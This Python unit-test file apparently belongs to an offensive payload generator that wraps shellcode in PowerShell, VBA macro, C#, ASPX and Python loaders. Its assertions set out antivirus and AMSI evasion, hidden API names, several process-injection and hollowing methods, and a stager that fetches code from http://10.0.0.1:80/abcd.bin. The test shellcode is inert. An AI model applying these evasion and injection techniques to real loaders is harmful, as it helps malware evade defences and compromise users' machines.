"""Unit tests verifying generator output structure for all formats."""

import os
import sys
import textwrap
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from modules.chain import apply_chain, build_single_stage, decryption_stubs_py
from modules.generators import ps1, vba, cs, aspx, py, raw
from modules.utils import bytes_to_ps1_array

SHELLCODE = b'\x90' * 64 + b'\xcc' * 16   # NOP sled + INT3 (safe for testing)


def _xor_meta():
    _, meta = apply_chain(SHELLCODE, [build_single_stage('xor', key=b'\xaa')])
    ct, meta = apply_chain(SHELLCODE, [build_single_stage('xor', key=b'\xaa')])
    return ct, meta


def _rc4_meta():
    ct, meta = apply_chain(SHELLCODE, [build_single_stage('rc4', key=b'TestRC4Key')])
    return ct, meta


def _rot_meta():
    ct, meta = apply_chain(SHELLCODE, [build_single_stage('rot', rot_n=13)])
    return ct, meta


class TestPS1Generator(unittest.TestCase):
    def test_xor_output_contains_amsi(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False)
        self.assertIn('Amsi', out)

    def test_output_is_string(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False)
        self.assertIsInstance(out, str)

    def test_contains_shellcode_bytes(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False)
        # Encrypted bytes should appear as 0xNN hex literals
        self.assertRegex(out, r'0x[0-9A-Fa-f]{2}')

    def test_uses_dynamic_api_resolution(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False)
        # APIs are resolved at runtime via GetProcAddress + a delegate, so the
        # high-value names must NOT appear as plaintext in the loader.
        self.assertIn('GetDelegateForFunctionPointer', out)
        self.assertIn('GetProcAddress', out)
        for api in ('VirtualAlloc', 'CreateThread', 'WaitForSingleObject'):
            self.assertNotIn(api, out, f"'{api}' should be hidden, not literal")

    def test_no_backtick_mangled_cmdlets(self):
        # Backtick-split cmdlets are a known Defender obfuscation signature.
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=True, obfuscation_level=3)
        self.assertNotIn('Ne`w', out)
        self.assertNotIn('A`d`d', out)

    def test_rc4_contains_rc4_function(self):
        ct, meta = _rc4_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False)
        # RC4 decryption stub should contain PRGA pattern
        self.assertIn('-bxor', out)

    def test_debug_output(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False, enable_debug=True)
        self.assertIn('DEBUG', out)

    def test_obfuscated_output_larger(self):
        ct, meta = _xor_meta()
        clean = ps1.generate(ct, meta, enable_obfuscation=False)
        obfusc = ps1.generate(ct, meta, enable_obfuscation=True, obfuscation_level=2)
        self.assertGreater(len(obfusc), len(clean))

    def test_staged_has_no_embedded_shellcode(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False,
                           staged_url="http://10.0.0.1:80/abcd.bin")
        # Stager must download the payload, not embed it as hex arrays.
        self.assertIn('DownloadData', out)
        self.assertNotIn('[Byte[]] $encrypted = $', out)
        # The encrypted bytes themselves must NOT appear inline.
        self.assertNotIn(bytes_to_ps1_array(ct), out)

    def test_staged_url_is_chunked(self):
        ct, meta = _xor_meta()
        url = "http://10.0.0.1:80/abcd.bin"
        out = ps1.generate(ct, meta, enable_obfuscation=False, staged_url=url)
        # The literal URL must not appear; it is reassembled from chunks.
        self.assertNotIn(url, out)
        self.assertIn('$url', out)

    def test_staged_still_decrypts_and_executes(self):
        ct, meta = _xor_meta()
        out = ps1.generate(ct, meta, enable_obfuscation=False,
                           staged_url="http://10.0.0.1:80/abcd.bin")
        # Decryption stubs and dynamic execution core are still present.
        self.assertIn('GetProcAddress', out)
        self.assertIn('GetDelegateForFunctionPointer', out)


class TestVBAGenerator(unittest.TestCase):
    def test_xor_output(self):
        ct, meta = _xor_meta()
        out = vba.generate(ct, meta)
        self.assertIn('VirtualAlloc', out)
        self.assertIn('CreateThread', out)
        self.assertIn('AutoOpen', out)

    def test_rc4_output(self):
        ct, meta = _rc4_meta()
        out = vba.generate(ct, meta)
        # RC4 VBA stub contains the PRGA XOR pattern
        self.assertIn('XOR S(', out.upper())

    def test_win64_ptrSafe(self):
        ct, meta = _xor_meta()
        out = vba.generate(ct, meta)
        self.assertIn('PtrSafe', out)

    def test_aes_raises(self):
        meta = [{'algo': 'aes256', 'key': b'\x00'*32, 'iv': b'\x00'*16}]
        ct = b'\x00' * 32
        with self.assertRaises(ValueError):
            vba.generate(ct, meta)

    def test_contains_byte_array(self):
        ct, meta = _xor_meta()
        out = vba.generate(ct, meta)
        # Should contain numeric byte values
        self.assertRegex(out, r'\d+,\s*\d+')


class TestCSGenerator(unittest.TestCase):
    def test_valloc_output(self):
        ct, meta = _xor_meta()
        out = cs.generate(ct, meta, injection_method='valloc')
        self.assertIn('VirtualAlloc', out)
        self.assertIn('CreateThread', out)
        self.assertIn('static void Main', out)

    def test_pinject_output(self):
        ct, meta = _xor_meta()
        out = cs.generate(ct, meta, injection_method='pinject')
        self.assertIn('OpenProcess', out)
        self.assertIn('CreateRemoteThread', out)

    def test_ntinject_output(self):
        ct, meta = _rot_meta()
        out = cs.generate(ct, meta, injection_method='ntinject')
        self.assertIn('NtCreateSection', out)
        self.assertIn('RtlCreateUserThread', out)

    def test_hollow_output(self):
        ct, meta = _xor_meta()
        out = cs.generate(ct, meta, injection_method='hollow')
        self.assertIn('CreateProcess', out)
        self.assertIn('ResumeThread', out)

    def test_unknown_method_raises(self):
        ct, meta = _xor_meta()
        with self.assertRaises(ValueError):
            cs.generate(ct, meta, injection_method='magic')

    def test_cs_compiles_structure(self):
        ct, meta = _xor_meta()
        out = cs.generate(ct, meta)
        self.assertIn('using System;', out)
        self.assertIn('static void Main', out)
        self.assertIn('namespace', out)

    def test_target_process_appears_in_pinject(self):
        ct, meta = _xor_meta()
        out = cs.generate(ct, meta, injection_method='pinject', target_process='notepad')
        self.assertIn('notepad', out)


class TestASPXGenerator(unittest.TestCase):
    def test_xor_output(self):
        ct, meta = _xor_meta()
        out = aspx.generate(ct, meta)
        self.assertIn('Page_Load', out)
        self.assertIn('VirtualAlloc', out)

    def test_rot_output(self):
        ct, meta = _rot_meta()
        out = aspx.generate(ct, meta)
        self.assertIn('Page_Load', out)

    def test_rc4_raises(self):
        ct, meta = _rc4_meta()
        with self.assertRaises(ValueError):
            aspx.generate(ct, meta)

    def test_aes_raises(self):
        meta = [{'algo': 'aes256', 'key': b'\x00'*32, 'iv': b'\x00'*16}]
        ct = b'\x00' * 48
        with self.assertRaises(ValueError):
            aspx.generate(ct, meta)

    def test_aspx_header(self):
        ct, meta = _xor_meta()
        out = aspx.generate(ct, meta)
        self.assertIn('<%@ Page', out)


class TestPyGenerator(unittest.TestCase):
    def test_xor_output(self):
        ct, meta = _xor_meta()
        out = py.generate(ct, meta)
        self.assertIn('VirtualAlloc', out)
        self.assertIn('CreateThread', out)
        self.assertIn('def run():', out)
        self.assertIn('if __name__ == "__main__":', out)

    def test_returns_string(self):
        ct, meta = _xor_meta()
        self.assertIsInstance(py.generate(ct, meta), str)

    def test_contains_base64_shellcode(self):
        ct, meta = _xor_meta()
        out = py.generate(ct, meta)
        self.assertRegex(out, r'base64\.b64decode\("[A-Za-z0-9+/=]+"\)')

    def test_rc4_output(self):
        ct, meta = _rc4_meta()
        out = py.generate(ct, meta)
        # RC4 KSA / PRGA present
        self.assertIn('range(256)', out)

    def test_rot_output(self):
        ct, meta = _rot_meta()
        out = py.generate(ct, meta)
        self.assertIn('def run():', out)

    def test_aes_output_contains_bcrypt(self):
        # Hand-built metadata so the test does not require pycryptodome.
        meta = [{'algo': 'aes256', 'key': b'\x00' * 32, 'iv': b'\x00' * 16}]
        ct = b'\x00' * 48
        out = py.generate(ct, meta)
        self.assertIn('BCryptDecrypt', out)
        self.assertIn('ChainingModeCBC', out)

    def test_xor_roundtrip(self):
        ct, meta = _xor_meta()
        helpers, calls = decryption_stubs_py(meta)
        ns = {'buf': ct}
        exec(helpers, ns)
        exec(textwrap.dedent(calls), ns)
        self.assertEqual(ns['buf'], SHELLCODE)

    def test_rc4_roundtrip(self):
        ct, meta = _rc4_meta()
        helpers, calls = decryption_stubs_py(meta)
        ns = {'buf': ct}
        exec(helpers, ns)
        exec(textwrap.dedent(calls), ns)
        self.assertEqual(ns['buf'], SHELLCODE)

    def test_rot_roundtrip(self):
        ct, meta = _rot_meta()
        helpers, calls = decryption_stubs_py(meta)
        ns = {'buf': ct}
        exec(helpers, ns)
        exec(textwrap.dedent(calls), ns)
        self.assertEqual(ns['buf'], SHELLCODE)

    def test_chain_roundtrip(self):
        # Multi-layer XOR -> RC4 -> ROT (applied left-to-right).
        from modules.chain import parse_chain_spec
        stages = parse_chain_spec('xor:KEY=0xAA,rc4:KEY=chainkey,rot:N=13')
        ct, meta = apply_chain(SHELLCODE, stages)
        helpers, calls = decryption_stubs_py(meta)
        ns = {'buf': ct}
        exec(helpers, ns)
        exec(textwrap.dedent(calls), ns)
        self.assertEqual(ns['buf'], SHELLCODE)


class TestRawGenerator(unittest.TestCase):
    def test_passthrough(self):
        ct, _ = _xor_meta()
        result = raw.generate(ct)
        self.assertEqual(result, ct)

    def test_returns_bytes(self):
        ct, _ = _xor_meta()
        result = raw.generate(ct)
        self.assertIsInstance(result, bytes)


if __name__ == '__main__':
    unittest.main()
